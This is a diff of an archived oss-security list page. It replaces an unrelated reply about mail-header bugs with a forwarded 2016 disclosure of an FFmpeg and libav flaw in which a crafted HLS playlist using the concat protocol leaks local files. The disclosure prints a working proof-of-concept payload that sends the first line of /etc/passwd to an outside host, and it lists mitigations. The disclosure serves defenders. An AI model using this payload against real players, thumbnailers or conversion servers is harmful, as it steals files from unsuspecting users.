@@ -1,30 +1,62 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/22/11
-Message-ID: <20160822131645.GA6176@openwall.com>
-Date: Mon, 22 Aug 2016 16:16:45 +0300
-From: Solar Designer <solar@...nwall.com>
-To: Werner Koch <wk@...pg.org>
-Cc: oss-security@...ts.openwall.com
-Subject: Re: memory issues in libksba 1.3.4 and git
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/13/3
+Message-ID: <56962EA3.5000108@securityvulns.ru>
+Date: Wed, 13 Jan 2016 14:01:55 +0300
+From: Vladimir Dubrovin <vlad@...urityvulns.ru>
+To: oss-security@...ts.openwall.com
+Subject: Fwd: FFmpeg: stealing local files with HLS+concat
 Content-Type: text/plain; charset=utf-8
 
-On Mon, Aug 22, 2016 at 02:56:20PM +0200, Werner Koch wrote:
-> On Mon, 22 Aug 2016 13:15, solar@...nwall.com said:
-> > Werner, maybe you could try this old workaround for next time you post? -
-> >
-> >   (setq mml-insert-mime-headers-always t)
-> 
-> Done.  Thanks for pointing me to this setting; for reference this is:
-> 
->   If non-nil, always put Content-Type: text/plain at top of empty parts.
->   It is necessary to work against a bug in certain clients.
 
-Thanks.  This appears to have made no effect, and thus didn't work
-around whatever ezmlm-idx bug(?) your messages are triggering here.
-Your messages are missing the Content-Type header for MIME parts that
-are not empty, so this does not literally fit the description above.
+---------- Forwarded message ----------
+From: Максим Андреев <andreevmaxim@...il.com>
+Date: 13 January 2016 at 13:41
+Subject: FFmpeg: stealing local files with HLS+concat
+To: oss-security@...ts.openwall.com
 
-Anyway, it's not a topic for oss-security.  I am merely noting that this
-is something I need to investigate and fix... eventually.
 
-Alexander
+Hello!
+I found some strange behavior in ffmpeg which can lead to stealing local
+files during ffmpeg/ffprobe exec, it's also applied to libav.
+
+I've underestimated the impact of this bug, so it was full disclosured
+in this article (Russian language, but google translate works fine with
+it) - http://habrahabr.ru/company/mailru/blog/274855
+
+
+In short:
+if linux user download specially prepared video file (with any
+extension: avi/mov/etc..) which contains HLS m3u8 playlist with "concat"
+protocol in url:,
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:10.0,
+concat:http://dx.su/header.m3u8|file:///etc/passwd
+#EXT-X-ENDLIST
+
+header.m3u8:
+#EXTM3U
+#EXT-X-MEDIA-SEQUENCE:0
+#EXTINF:,
+http://example.org?
+
+If user launches ffmpeg-based video player (MPlayer, etc..), first line
+of /etc/passwd will be sent to http://example.org? in
+http://example.org?# $FreeBSD: release/100.0/et..  request.
+The same happens when file manager tries to generate thumbnail for this
+file.
+
+All this can be applied to server-run ffmpeg during video conversion.
+FFmpeg/libav security teams are already notified, but official patches
+are not available yet, so you can rebuild ffmpeg with --disable-network
+configure option which prevents this vulnerability from being exploited.
+
+Moreover, it's always recommended to run ffmpeg in isolated environment
+when processing untrusted files
+(googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand-fixes.html)
+
+-- 
+Maxim Andreev
+
+
+
